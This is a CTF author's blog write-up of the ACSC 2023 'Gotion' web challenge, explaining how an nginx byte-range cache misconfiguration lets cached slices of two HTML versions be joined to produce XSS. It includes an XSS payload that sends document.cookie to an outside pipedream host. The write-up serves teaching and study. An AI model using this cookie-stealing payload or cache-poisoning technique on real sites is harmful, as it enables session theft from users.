<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D}</style><title>ACSC 2023 Gotion Challenge Author Writeup</title><meta name=description content><meta name=keywords content><meta property="og:url" content="https://blog.tyage.net/posts/2023-03-12-acsc-2023-gotion/"><meta property="og:type" content="website"><meta property="og:title" content="ACSC 2023 Gotion Challenge Author Writeup"><meta property="og:description" content><meta property="og:image" content="https://blog.tyage.net/icon/icon.jpg"><meta property="og:image:secure_url" content="https://blog.tyage.net/icon/icon.jpg"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="ACSC 2023 Gotion Challenge Author Writeup"><meta name=twitter:description content><meta property="twitter:domain" content="https://blog.tyage.net/posts/2023-03-12-acsc-2023-gotion/"><meta property="twitter:url" content="https://blog.tyage.net/posts/2023-03-12-acsc-2023-gotion/"><meta name=twitter:image content="https://blog.tyage.net/icon/icon.jpg"><link rel=canonical href=https://blog.tyage.net/posts/2023-03-12-acsc-2023-gotion/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.edd985581bf860dfb4507e5885197f1680160c7fe19f23b31e183126d99dd596.js integrity="sha256-7dmFWBv4YN+0UH5YhRl/FoAWDH/hnyOzHhgxJtmd1ZY="></script>
<link rel=alternate type=application/activity+json href=https://fed.brid.gy/r/https://blog.tyage.net/posts/2023-03-12-acsc-2023-gotion/><link rel=webmention href=https://webmention.io/blog.tyage.net/webmention><link rel=pingback href=https://webmention.io/blog.tyage.net/xmlrpc><link rel=stylesheet type=text/css href=/css/style.css><script src=/js/redirect.js></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C64TPJYY96"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-C64TPJYY96")</script><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1507795450221855" crossorigin=anonymous></script></head><body><script type=text/javascript>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://blog.tyage.net><img src=https://blog.tyage.net/icon/icon.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://blog.tyage.net>blog.tyage.net</a></div><div class=nav-links><div class=nav-link><a href=https://blog.tyage.net/post><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://blog.tyage.net/index.xml><span data-feather=rss></span> RSS</a></div><div class=nav-link><a href=https://tyage.net><span data-feather=home></span> About me</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span id=dark-theme-toggle-screen-reader-target class=sr-only></span>
<a><span id=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span id=hamburger-menu-toggle-screen-reader-target class=sr-only>menu</span>
<a><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://blog.tyage.net/post><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://blog.tyage.net/index.xml><span data-feather=rss></span> RSS</a></li><li class=nav-item><a href=https://tyage.net><span data-feather=home></span> About me</a></li><li class="nav-item dark-theme-toggle"><span id=dark-theme-toggle-screen-reader-target class=sr-only>theme</span>
<a><span id=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container h-entry"><div class=post-header-section><h1 class=p-name>ACSC 2023 Gotion Challenge Author Writeup</h1><small role=doc-subtitle></small><p class=post-date>2023/03/12 00:00:00</p><ul class=post-tags></ul></div><div class=post-content><div class=e-content><p>I made a Gotion Challenge in <a href=https://acsc.asia/>ACSC</a> (Asian Cyber Security Challenge) 2023.</p><p>This is a byte-range cache poisoning XSS challenge.</p><p>Challenge Description:</p><pre tabindex=0><code>Gotion is yet another simple secure note service. You might have seen these kind of applications many times before, but try this one!
</code></pre><p>Challenge Repository: <a href=https://github.com/tyage/acsc2023-gotion>https://github.com/tyage/acsc2023-gotion</a></p><blockquote class=twitter-tweet><p lang=en dir=ltr>In ACSC 2023, I made a Gotion challenge and promotion video :) Thank you everyone who played! <a href=https://t.co/SN4PXKkKid>pic.twitter.com/SN4PXKkKid</a></p>&mdash; もうダニ by 左京区在中 (@tyage) <a href="https://twitter.com/tyage/status/1629679515529281536?ref_src=twsrc%5Etfw">February 26, 2023</a></blockquote><script async src=https://platform.twitter.com/widgets.js></script><h1 id=challenge-details>Challenge Details</h1><p>The challenge has three components: Go web application, nginx and bot.
This is obviously an XSS challenge as the bot has FLAG in the cookie.</p><p>The Go app allows users to create simple note pages with only title and body.
The title &ldquo;Gotion&rdquo; is a parody of the famous note-taking app Notion and Go.</p><p>Users can enter title and body, but they are HTML escaped.
Therefore it is not possible to cause XSS in the notes page.</p><p>The key points here are that notes have their own unique URL and Gotion creates static HTML files for each note page like SSG (Static Site Generator).
Users can control the last part of the note URL, but they are only allowed to use restricted characters <code>[a-zA-Z0-9 ]</code>.</p><p>Looking inside nginx, the config file has a suspicious cache directive.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nginx data-lang=nginx><span style=display:flex><span><span style=color:#66d9ef>proxy_cache_path</span> <span style=color:#e6db74>/tmp/nginx</span> <span style=color:#e6db74>keys_zone=mycache:10m</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>server</span> {
</span></span><span style=display:flex><span>    <span style=color:#f92672>listen</span> <span style=color:#ae81ff>80</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>location</span> ~ <span style=color:#e6db74>.mp4$</span> {
</span></span><span style=display:flex><span>        <span style=color:#75715e># Smart and Efficient Byte-Range Caching with NGINX
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e># https://www.nginx.com/blog/smart-efficient-byte-range-caching-nginx/
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#f92672>proxy_cache</span> <span style=color:#e6db74>mycache</span>;
</span></span><span style=display:flex><span>        <span style=color:#f92672>slice</span>              <span style=color:#ae81ff>4096</span>; <span style=color:#75715e># Maybe it should be bigger?
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#f92672>proxy_cache_key</span>    $host$uri$is_args$args$slice_range;
</span></span><span style=display:flex><span>        <span style=color:#f92672>proxy_set_header</span>   <span style=color:#e6db74>Range</span> $slice_range;
</span></span><span style=display:flex><span>        <span style=color:#f92672>proxy_http_version</span> <span style=color:#ae81ff>1</span><span style=color:#e6db74>.1</span>;
</span></span><span style=display:flex><span>        <span style=color:#f92672>proxy_cache_valid</span>  <span style=color:#ae81ff>200</span> <span style=color:#ae81ff>206</span> <span style=color:#e6db74>1h</span>;
</span></span><span style=display:flex><span>        <span style=color:#f92672>proxy_pass</span> <span style=color:#e6db74>http://app:3000</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>location</span> <span style=color:#e6db74>/</span> {
</span></span><span style=display:flex><span>        <span style=color:#f92672>proxy_pass</span> <span style=color:#e6db74>http://app:3000</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>This directive caches an mp4 file, but it is not a normal cache, it is a <a href=https://www.nginx.com/blog/smart-efficient-byte-range-caching-nginx/>byte-range cache</a> which allows us to cache part of the content.
When a client requests <code>Range: bytes=0-1000</code>, nginx requests the content with a <code>Range: bytes=0-4095</code> header to the origin server and caches the response.
If a client requests <code>Range: bytes=0-1000</code> again, nginx can respond quickly because there is a cache of the first 4096 bytes.</p><p>This config file also has an error in the location directive.
The <code>.</code> in <code>location ~ .mp4$</code> does not mean <code>.</code> but any character, because this is RegExp.
This directive was made for the video file <code>howto.mp4</code> but the file such as <code>FOOBARmp4</code> will unfortunately be cached.</p><h1 id=solution>Solution</h1><p>The solution is byte range cache poisoning, which causes nginx to return HTML containing XSS payload.</p><p>This is possible because nginx concatenates segmented caches.
Consider a situation where nginx has the content cache, but only the first 4096 bytes, and the content was updated later.
When a client makes a request without a range header, nginx will retrieve the rest of the updated content and concatenate it with the first cache.</p><p>In other words, we can concatenate the sliced parts of two different HTMLs!</p><p>The steps to exploit this into XSS are below.</p><ol><li><p>Create a note page whose URL ends with <code>AAAAAAAAAAAAAAAAAmp4</code> so that it will be cached.</p></li><li><p>Modify the HTML of the note so that the first 4096 bytes end with <code>&lt;</code>.</p></li></ol><p>The first 4096 bytes of HTML will look like this</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE html&gt;</span>
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>html</span> <span style=color:#a6e22e>lang</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;en&#34;</span>&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>head</span>&gt;
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>          &lt;<span style=color:#f92672>textarea</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;body&#34;</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;form-control&#34;</span> <span style=color:#a6e22e>placeholder</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;note&#34;</span> <span style=color:#a6e22e>style</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;height: 300px;&#34;</span>&gt;AAAA...AAAAA<span style=color:#960050;background-color:#1e0010>&lt;</span>
</span></span></code></pre></div><ol start=3><li><p>Cache the first 4096 bytes with a range header <code>curl http://.../...AAAAAAAAAAAAAAAAAmp4 -H "Range: bytes=0-4095"</code>.</p></li><li><p>Update the page so that the second 4096 bytes block starts with <code>img src=x onerror=[payload here]</code>.</p></li></ol><p>The second block will look like this</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>img src=x onerror=location=`//eo7x31ojradre3r.m.pipedream.net/?c=${document.cookie}` x=&lt;/<span style=color:#f92672>textarea</span>&gt;
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>body</span>&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>html</span>&gt;
</span></span></code></pre></div><ol start=5><li><p>Report the URL <code>http://.../...AAAAAAAAAAAAAAAAAmp4</code></p></li><li><p>Wait for the flag and done!</p></li></ol><p>The full solution script is here <a href=https://github.com/tyage/acsc2023-gotion/blob/main/solution/solve.py>https://github.com/tyage/acsc2023-gotion/blob/main/solution/solve.py</a>.</p><h1 id=unintended-solution>Unintended Solution</h1><p>There is an unintended solution.
I forgot to write an exclusive lock when Go app write a HTML to file.</p><p><a href=https://github.com/tyage/acsc2023-gotion/blob/main/app/main.go#L117>https://github.com/tyage/acsc2023-gotion/blob/main/app/main.go#L117</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span>		<span style=color:#a6e22e>f</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>os</span>.<span style=color:#a6e22e>OpenFile</span>(<span style=color:#a6e22e>noteFilePath</span>, <span style=color:#a6e22e>os</span>.<span style=color:#a6e22e>O_WRONLY</span>|<span style=color:#a6e22e>os</span>.<span style=color:#a6e22e>O_TRUNC</span>, <span style=color:#ae81ff>0644</span>)
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>Error</span>(<span style=color:#a6e22e>w</span>, <span style=color:#e6db74>&#34;invalid note&#34;</span>, <span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusInternalServerError</span>)
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>WriteNote</span>(<span style=color:#a6e22e>f</span>, <span style=color:#a6e22e>NoteParam</span>{
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>Id</span>:    <span style=color:#a6e22e>noteId</span>,
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>URL</span>:   <span style=color:#a6e22e>noteURL</span>,
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>Title</span>: <span style=color:#a6e22e>title</span>,
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>Body</span>:  <span style=color:#a6e22e>body</span>,
</span></span><span style=display:flex><span>		})
</span></span></code></pre></div><p>It causes race condition when the app process <code>WriteNote</code> at the same time and it was possible to store broken HTML causing XSS.</p><h1 id=comment>Comment</h1><p>To make a challenge solvable, origin HTTP server must support byte-range request and must <em>not</em> return E-Tag header.
Fortunately, Go net/http server meets these requirements therefore I chose the Go server.</p><p>Not only nginx but also some other HTTP cache servers and CDNs have this kind of implementation, so I think this concept has a chance to be exploited in a real environment.</p><p>I think this is the first PoC of byte-range cache poisoning XSS and I wish the participants have enjoyed the challenge!</p></div></div><div><script src=/js/webmention.min.js data-max-webmentions=60 async></script><div id=webmentions></div></div><div class=prev-next><div class=prev-post><p><a href=/posts/2021-06-27-dependabot-rce/>&#8592;
Previous:
Diving into Dependabot along with a bug in npm</a></p><p class=prev-post-date>July 12, 2021</p></div><div class=next-post><p><a href=/post/2023/2023-07-09-test4/>Next:
&#8594;</a></p><p class=next-post-date>July 9, 2023</p></div></div><div style=display:none><a class=u-bridgy-fed href=https://fed.brid.gy/></a><p class=dt-published>2023-03-12T00:00:00+09:00</p></div></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><a href=#challenge-details>Challenge Details</a></li><li><a href=#solution>Solution</a></li><li><a href=#unintended-solution>Unintended Solution</a></li><li><a href=#comment>Comment</a></li></ul></nav></nav></aside></main><footer class=footer><span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/526avijitgupta/gokarna>Gokarna</a></span></footer></body></html>